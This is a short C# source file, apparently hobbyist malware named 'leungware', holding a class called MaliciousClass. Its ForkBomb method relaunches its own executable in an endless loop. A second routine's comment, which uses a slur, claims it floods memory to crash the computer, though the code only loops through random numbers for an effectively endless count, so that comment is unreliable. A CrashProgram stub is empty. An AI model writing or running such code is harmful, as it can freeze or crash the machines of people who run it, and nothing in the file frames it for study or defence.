using System;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace leungware_v420
{
    public class MaliciousClass
    {
        public static void ForkBomb(bool confirmation)
        {
            while (confirmation)
            {
                Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }

        private static Tuple<double, long> GetResult()
        {
            /* Allocates retard levels of things into memory, effectively crashing the program, and in low memory systems
             (e.g John's Computer), may cause a total failure of the computer.*/
            long chunkSize = Int64.MaxValue;
            long nSizeGetter = Int64.MaxValue;
            Random random = new Random();
            long n = 0;
            double total = 0;
            for (int i = 0; i <= (long) Math.Ceiling(nSizeGetter * 1.0 / chunkSize) - 1; i++)
            {
                for (int j = 0; j <= Math.Min(nSizeGetter - n - 1, chunkSize) - 1; j++)
                {
                    double value = random.NextDouble();
                    total += value;
                    n++;
                }
            }
            return new Tuple<double, long>(total/n, n);
        }
        public static void CrashProgram()
        {
            
        }
    }
}
